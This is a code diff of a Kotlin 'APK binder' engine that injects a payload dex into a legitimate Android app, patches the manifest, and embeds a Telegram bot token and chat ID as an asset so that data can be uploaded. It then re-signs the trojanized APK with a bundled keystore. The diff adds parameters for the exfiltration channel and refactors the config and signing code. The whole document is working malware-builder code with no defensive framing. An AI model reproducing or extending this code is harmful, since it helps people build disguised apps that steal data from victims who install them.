@@ -2,7 +2,7 @@ package Com.devhs.apkbinder.binder
 
 import android.content.Context
 import com.android.apksig.ApkSigner
-import Com.devhs.apkbinder.Const
+import Com.devhs.apkbinder.core.Const
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import java.io.File
@@ -35,6 +35,8 @@ class BinderEngine(private val context: Context) {
         sourceApk: File,
         outApk: File,
         features: Collection<String>,
+        botToken: String = "",
+        chatId: String = "",
         onLog: (String) -> Unit
     ): BindResult = withContext(Dispatchers.IO) {
 
@@ -56,6 +58,9 @@ class BinderEngine(private val context: Context) {
 
             val authority = pkg + Const.AUTHORITY_SUFFIX
             onLog("[INFO] Authority: $authority")
+
+            val token = botToken.ifBlank { readConfig().first }
+            val chat = chatId.ifBlank { readConfig().second }
 
             temp = File(outApk.parentFile, outApk.nameWithoutExtension + ".unsigned.apk")
 
@@ -101,6 +106,7 @@ class BinderEngine(private val context: Context) {
 
                                 if (name == MANIFEST) continue
                                 if (name == payloadDexName) continue
+                                if (name == "assets/" + Const.CONFIG_ASSET) continue
                                 if (isSignatureFile(name)) continue
 
                                 val data = zip.getInputStream(e).use { it.readBytes() }
@@ -111,10 +117,12 @@ class BinderEngine(private val context: Context) {
                             writeEntry(zos, cs, MANIFEST, patched!!, false)
                             writeEntry(zos, cs, payloadDexName, payloadDex, false)
 
-                            val (tk, ch) = readConfig()
-                            if (tk.isNotBlank() && ch.isNotBlank()) {
-                                val json = "{\"bot_token\":\"$tk\",\"chat_id\":\"$ch\"}"
-                                writeEntry(zos, cs, "assets/hs_config.json", json.toByteArray(), false)
+                            if (token.isNotBlank() && chat.isNotBlank()) {
+                                val json = "{\"bot_token\":\"$token\",\"chat_id\":\"$chat\"}"
+                                writeEntry(
+                                    zos, cs, "assets/" + Const.CONFIG_ASSET,
+                                    json.toByteArray(), false
+                                )
                                 onLog("[INFO] Config injected")
                             } else {
                                 onLog("[WARN] Config not found - uploads will fail")
@@ -164,8 +172,8 @@ class BinderEngine(private val context: Context) {
 
     private fun readConfig(): Pair<String, String> {
         val p = context.getSharedPreferences("hs_prefs", Context.MODE_PRIVATE)
-        var t = p.getString(Const.PREF_BOT_TOKEN, "") ?: ""
-        var c = p.getString(Const.PREF_CHAT_ID, "") ?: ""
+        var t = p.getString("bot_token", "") ?: ""
+        var c = p.getString("chat_id", "") ?: ""
         if (t.isNotBlank() && c.isNotBlank()) return t to c
 
         val dir = File(context.filesDir, "datastore")
@@ -299,12 +307,14 @@ class BinderEngine(private val context: Context) {
 
     private fun sign(input: File, output: File, onLog: (String) -> Unit) {
         val ks = KeyStore.getInstance("JKS")
-        context.assets.open(Const.KEYSTORE_FILE).use {
-            ks.load(it, Const.KEYSTORE_PASS.toCharArray())
+        context.assets.open(Const.KEYSTORE_ASSET).use {
+            ks.load(it, Const.KS_PASS.toCharArray())
         }
 
-        val alias = ks.aliases().nextElement()
-        val key = ks.getKey(alias, Const.KEYSTORE_PASS.toCharArray()) as PrivateKey
+        val alias = if (ks.containsAlias(Const.KS_ALIAS)) Const.KS_ALIAS
+        else ks.aliases().nextElement()
+
+        val key = ks.getKey(alias, Const.KS_PASS.toCharArray()) as PrivateKey
         val cert = ks.getCertificate(alias) as X509Certificate
 
         val signer = ApkSigner.SignerConfig.Builder(alias, key, listOf(cert)).build()
